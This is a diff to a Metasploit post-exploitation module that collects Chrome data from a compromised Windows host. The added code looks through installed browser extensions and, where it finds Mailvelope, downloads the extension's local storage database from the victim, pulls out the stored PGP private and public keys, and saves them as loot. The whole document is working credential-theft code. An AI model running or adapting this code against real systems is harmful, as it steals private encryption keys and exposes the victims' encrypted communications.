@@ -29,7 +29,8 @@ class Metasploit3 < Msf::Post
 				[
 					'Sven Taute', #Original (Meterpreter script)
 					'sinn3r',     #Metasploit post module
-					'Kx499'       #x64 support
+					'Kx499',       #x64 support
+					'mubix'       #Parse extensions
 				]
 		))
 
@@ -38,6 +39,70 @@ class Metasploit3 < Msf::Post
 				OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),
 			], self.class)
 	end
+
+	def extension_parse_mailvelope(username, extname)
+		chrome_path = @profiles_path + "\\" + username + @data_path
+		maildb_path = chrome_path + "/Local Storage/chrome-extension_#{extname}_0.localstorage"
+		begin
+			x = session.fs.file.stat(maildb_path)
+		rescue
+			print_error("==> Mailvelope database not found")
+			return
+		end
+		print_status("==> Downloading Mailvelope database...")
+		local_path = store_loot("chrome.ext.mailvelope", "text/plain", session, "chrome_ext_mailvelope")
+		session.fs.file.download_file(local_path, maildb_path)
+		print_status("==> Downloaded to #{local_path}")
+
+		maildb = SQLite3::Database.new(local_path)
+		columns, *rows = maildb.execute2("select * from ItemTable;")
+		maildb.close
+
+		rows.each do |row|
+			res = Hash[*columns.zip(row).flatten]
+			if res["key"] =~ /privatekeys/i
+				keys = res["value"].split(",")
+				print_good("==> Found #{keys.size} private key(s)!")
+				keys.each do |key|
+					privkey = key.split("\x00").join.tr("[]","").split("\\r").join.split("\"").join.split("\\n").join("\n")
+					vprint_good(privkey)
+					path = store_loot("chrome.mailvelope.privkey", "text/plain", session, privkey, "privkey.key", "Mailvelope PGP Private Key")
+					print_status("==> Saving private key to: #{path}")
+				end
+			end
+			if res["key"] =~ /publickeys/i
+				keys = res["value"].split(",")
+				print_good("==> Found #{keys.size} public key(s)!")
+				keys.each do |key|
+					pubkey = key.split("\x00").join.tr("[]","").split("\\r").join.split("\"").join.split("\\n").join("\n")
+					vprint_good(pubkey)
+					path = store_loot("chrome.mailvelope.pubkey", "text/plain", session, pubkey, "pubkey.key", "Mailvelope PGP Public Key")
+					print_status("==> Saving public key to: #{path}")
+				end
+			end
+		end
+	end
+
+
+
+	def parse_prefs(username, filepath)
+		f = File.open(filepath, 'r')
+		until f.eof
+			prefs = f.read
+		end
+		results = ActiveSupport::JSON.decode(prefs)
+		print_status("Extensions installed: ")
+		results['extensions']['settings'].each do |name,values|
+			if values['manifest']
+				print_status("=> #{values['manifest']['name']}")
+				if values['manifest']['name'] =~ /mailvelope/i
+					print_good("==> Found Mailvelope extension, extracting PGP keys")
+					extension_parse_mailvelope(username, name)
+				end
+			end
+		end
+	end
+
 
 	def decrypt_data(data)
 		rg = session.railgun
@@ -77,6 +142,10 @@ class Metasploit3 < Msf::Post
 		)
 
 		@chrome_files.each do |item|
+			if item[:in_file] == "Preferences"
+				parse_prefs(username, item[:raw_file])
+			end
+
 			next if item[:sql] == nil
 			next if item[:raw_file] == nil
 
